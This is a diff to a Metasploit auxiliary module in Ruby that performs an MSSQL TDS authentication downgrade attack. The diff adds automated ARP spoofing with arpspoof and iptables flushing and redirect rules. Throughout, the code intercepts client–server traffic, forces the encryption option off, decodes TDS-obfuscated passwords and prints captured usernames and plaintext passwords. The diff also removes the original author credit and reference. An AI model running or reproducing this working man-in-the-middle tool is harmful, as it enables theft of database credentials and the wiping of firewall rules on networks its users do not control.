@@ -2,7 +2,6 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	# we mixin both Tcp and TcpServer, hope this doesn't break anything
 	include Msf::Exploit::Remote::Tcp
 	alias_method :cleanup_tcp, :cleanup
 	alias_method :run_tcp, :run
@@ -10,61 +9,64 @@ class Metasploit3 < Msf::Auxiliary
 	alias_method :cleanup_tcpserver, :cleanup
 	alias_method :run_tcpserver, :run
 	alias_method :exploit_tcpserver, :exploit
-# seems like there is a lot of mssql stuff implemented in metasploit, none of which seems useful here
-#	include Msf::Exploit::Remote::MSSQL
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'MSSQL Native Authentication Downgrade Attack',
+			'Name'           => 'MSSQL TDS Authentication Downgrade Attack with ARP Spoofing',
 			'Description'    => %q{
-This tool shows that the default configuration of Microsoft SQL Server and 
-clients, is not secure if the SQL Server native authentication is used and the 
-network cannot be trusted. Per default, the login credentials are submitted 
-encrypted via a TLS/SSL.
-If an attacker can perform any kind of mitm attack, the attacker is able to 
-trick the client/server into believing that encryption is not supported and, as
-a fallback mechanism, the login credentials are submitted as plaintext.
-},
-			'Author' 	 =>
-				[
-					'Michael Rodler'
-				],
+				This module performs an MSSQL TDS downgrade attack with integrated ARP spoofing 
+				and firewall rules setup to redirect traffic. If encryption is optional, a MITM 
+				attack can downgrade the TDS encryption, allowing plaintext credential capture.
+			},
+			'Author'         => ['Necr0'],
 			'License'        => BSD_LICENSE,
-			'Version'        => "1.0",
-			'References'     =>
-				[
-					[ 'URL', 'http://msdn.microsoft.com/en-us/library/dd304523%28v=PROT.13%29.aspx' ],
-					[ 'URL', 'http://f0rki.at/microsoft-sql-server-downgrade-attack.html' ],
-				],
-			'Privileged'     => false,
-			'DisclosureDate' => '2011-12-25',))
+			'Version'        => "1.1",
+			'References'     => [ ['URL', 'http://msdn.microsoft.com/en-us/library/dd304523%28v=PROT.13%29.aspx'] ],
+			'Privileged'     => true,
+			'DisclosureDate' => '2024-10-01'
+		))
 
 		deregister_options('SSL', 'SSLCert', 'SSLVersion', 'RPORT')
 	
 		register_options(
-			[
-				OptPort.new('SRVPORT', [ true, "TCP Port of the MSSQL Server. Also local listen port.", 1433 ]),
+			[   OptString.new('INTERFACE', [ true, "Local listen interface", "eth0" ]),
+                OptString.new('CLIENT', [ true, "Client IP address", "" ]),
+                OptString.new('RHOSTS', [ true, "IP-Address of the Target MS-SQL Server.", "" ]),
+				OptPort.new('SRVPORT', [ true, "TCP Port of the MS- SQL Server. Also local listen port", 1433 ]),
 				OptString.new('SRVHOST', [ true, "Local listen address.", "0.0.0.0" ]),
-				OptString.new('RHOST', [ true, "IP-Address of the MSSQL Server.", "0.0.0.0" ]),
+				
 			], self.class)
 		
 		datastore["RPORT"] = datastore["SRVPORT"]
 	end
 	
+    def setup_firewall_and_arp
+		interface = datastore['INTERFACE']
+		server = datastore['RHOSTS']
+		client = datastore['CLIENT']
+		port = datastore['SRVPORT']
 
-	def decode_tds_password(password)
-		# This function decodes the password...
-		# note that this is the reverse thing to
-		# Msf::Exploit::Remote::MSSQL.mssql_tds_encrypt
-		#citing MS-TDS specification:
-		#\"Before submitting a password from the client to the server, for
-		#every byte in the password buffer starting withthe position pointed
-		#to by IbPassword, the client SHOULD first swap the four high bits
-		#with the four low bits and then do a bit-XOR with 0xA5 (10100101). After
-		#reading a submitted password, for every byte in the password buffer 
-		#starting with the position pointed to by IbPassword, the server SHOULD 
-		#first do a bit-XOR with 0xA5 (10100101) and then swap the four high bits 
-		#with the four low bits.\""""
+		print_status("Setting up firewall rules and ARP spoofing...")
+		`iptables -F`
+		`iptables -t nat -F`
+		`iptables -t nat -A PREROUTING -p tcp --dport #{port} -j REDIRECT --to-port #{port}`
+
+		@arp_spoof_server = fork { exec "arpspoof -i #{interface} -t #{server} #{client}" }
+		@arp_spoof_client = fork { exec "arpspoof -i #{interface} -t #{client} #{server}" }
+
+		print_status("ARP spoofing started between #{client} and #{server} on interface #{interface}.")
+	end
+
+    def cleanup
+		print_status("Cleaning up ARP spoofing and firewall rules...")
+		`iptables -F`
+		`iptables -t nat -F`
+		Process.kill('KILL', @arp_spoof_server) if @arp_spoof_server
+		Process.kill('KILL', @arp_spoof_client) if @arp_spoof_client
+		super
+	end
+
+	def retrieve_password(password)
 		return password if password.nil? or password.length == 0
 		password = password.unpack("C*")
 		plain = []
@@ -79,8 +81,7 @@ a fallback mechanism, the login credentials are submitted as plaintext.
 	end
 
 	def run
-		print_status("set your firewall to something like this:")
-		print_status("iptables -t nat -A PREROUTING -p tcp --dport 1433 -j REDIRECT --to-port 1433")
+        setup_firewall_and_arp
 		exploit_tcpserver
 	end
 	alias_method :exploit, :run
@@ -104,19 +105,11 @@ a fallback mechanism, the login credentials are submitted as plaintext.
 		begin
 			data = client.get_once()
 			return if data.nil? or data.length == 0
-			#print_status("received the following from client")
-			#print_status(Rex::Text::to_hex_dump(data))
 			data = mangle_packet_from_client(data)
-			#print_status("sending the following to server")
-			#print_status(Rex::Text::to_hex_dump(data))
 			sock.send(data, 0)
 			respdata = sock.get_once()
 			return if respdata.nil? or respdata.length == 0
-			#print_status("received the following from server")
-			#print_status(Rex::Text::to_hex_dump(respdata))
 			respdata = mangle_packet_from_server(respdata)
-			#print_status("sending the following to client")
-			#print_status(Rex::Text::to_hex_dump(respdata))
 			client.put(respdata)
 		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
 		rescue ::Exception
@@ -148,8 +141,6 @@ a fallback mechanism, the login credentials are submitted as plaintext.
 	end #method
 	
 	def get_header_type(packet)
-		#tds_header = packet[0,8].unpack("CCnnCC")
-		#hdr_type = tds_header[0]
 		hdr_type = packet[0].unpack("C")[0]
 		if hdr_type == 0x12
 			return "PRELOGIN"
@@ -178,17 +169,17 @@ a fallback mechanism, the login credentials are submitted as plaintext.
 		while prelogin[i].unpack('C')[0] != 0xFF do
 			position, length = prelogin[i+1,i+5].unpack("nn")
 			option_token = prelogin[i].unpack("C")[0]
-			if option_token == 0x00 # PL_OPTION_TOKEN == VERSION
+			if option_token == 0x00 
 				if length != 6
-					#"Error: AARGGH! Out of spec or parsing fubar! version length: 0x%X\n"
+					
 					print_status("Error: Skipping current packet")
 					return prelogin
 				end
 				version, subbuild = prelogin[position,position+length].unpack(">Nn")
 				print_status("version: 0x" + version.to_s(16) + " subbuild: 0x" + subbuild.to_s(16))
-			elsif option_token == 0x01 # PL_OPTION_TOKEN == ENCRYPTION
+			elsif option_token == 0x01
 				if length != 1
-					# "Error: AARGGH! Out of spec or parsing fubar! encryption length
+					
 					print_status("Error: Skipping current packet")
 					return prelogin
 				end
@@ -215,31 +206,31 @@ a fallback mechanism, the login credentials are submitted as plaintext.
 					prelogin[position] = "\x02"
 				end
 				
-				break # we did the evil deed, so we can leave the loop...
+				break 
 			end
 			i += 5
-		end #while loop
+		end 
 		
 		return prelogin
 		
 	end #method
 	
-	def parse_login7(tds_pl) # just the tds packet paylod, without header
+	def parse_login7(tds_pl) 
 		print_status("Found TDS LOGIN7 packet, dumping information:")
 		print_status("#############################################")
 		['HostName', 'UserName', 'Password','Application', 'Server', nil, 'Library'].zip((36..62).step(4)).each do |name, o|
 			if not name.nil?
 				offset, length = tds_pl[o, 4].unpack("vv")
-				length = length * 2 # since we are parsing unicode widechars...
+				length = length * 2 
 				val = tds_pl[offset, length]
 				if name == "Password"
-					val = decode_tds_password(val)
+					val = retrieve_password(val)
 				end
-				print_status(name + ": " + val.force_encoding("LATIN1").encode("UTF-8"))			
+				print_status(name + ": " + val.force_encoding("ISO-8859-1").encode("UTF-8"))			
 			end
-		end #each
+		end 
 		print_status("#############################################")
 		return tds_pl
-	end #method
+	end 
 	
-end #class
+end 
